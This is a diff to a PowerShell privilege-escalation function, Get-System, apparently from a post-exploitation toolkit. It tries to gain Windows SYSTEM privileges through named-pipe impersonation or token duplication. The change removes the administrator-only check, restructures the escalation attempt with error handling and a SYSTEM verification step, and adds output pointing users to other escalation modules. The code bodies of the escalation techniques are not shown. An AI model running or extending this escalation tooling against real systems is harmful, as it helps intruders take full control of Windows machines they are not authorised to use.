@@ -548,20 +548,20 @@ function Get-System {
         }
     }
 
-    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
-        Write-Error "Script must be run as administrator" -ErrorAction Stop
+    # Check if already SYSTEM
+    if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem) {
+        Write-Output "[+] Already running as SYSTEM"
+        Write-Output "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
+        return
     }
 
-    if([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') {
-        Write-Error "Script must be run in STA mode, relaunch powershell.exe with -STA flag" -ErrorAction Stop
-    }
-
+    # Handle WhoAmI and RevToSelf first
     if($PSBoundParameters['WhoAmI']) {
         Write-Output "$([Environment]::UserDomainName)\$([Environment]::UserName)"
         return
     }
 
-    elseif($PSBoundParameters['RevToSelf']) {
+    if($PSBoundParameters['RevToSelf']) {
         $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
         $RevertToSelfDelegate = Get-DelegateType @() ([Bool])
         $RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)
@@ -574,9 +574,17 @@ function Get-System {
             Write-Warning "RevertToSelf failed."
         }
         Write-Output "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
+        return
     }
 
-    else {
+    # Check if STA mode required for Token technique
+    if($Technique -eq 'Token' -and [System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') {
+        Write-Error "Script must be run in STA mode, relaunch powershell.exe with -STA flag" -ErrorAction Stop
+    }
+
+    # Try to elevate - NamedPipe technique may work if user has service creation rights
+    # Token technique requires SeDebugPrivilege which typically requires admin
+    try {
         if($Technique -eq 'NamedPipe') {
             # if we're using named pipe impersonation with a service
             Get-SystemNamedPipe -ServiceName $ServiceName -PipeName $PipeName
@@ -585,6 +593,21 @@ function Get-System {
             # otherwise use token duplication
             Get-SystemToken
         }
+        
+        # Verify elevation worked
+        if ([System.Security.Principal.WindowsIdentity]::GetCurrent().IsSystem) {
+            Write-Output "[+] Successfully elevated to SYSTEM"
+            Write-Output "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
+        } else {
+            Write-Warning "Elevation attempted but did not achieve SYSTEM privileges"
+            Write-Output "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
+        }
+    }
+    catch {
+        Write-Warning "Privilege escalation failed: $_"
         Write-Output "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
+        Write-Output "Note: NamedPipe technique requires ability to create services (typically admin)"
+        Write-Output "      Token technique requires SeDebugPrivilege (typically requires admin)"
+        Write-Output "      For non-admin escalation, try other privesc modules first"
     }
 }
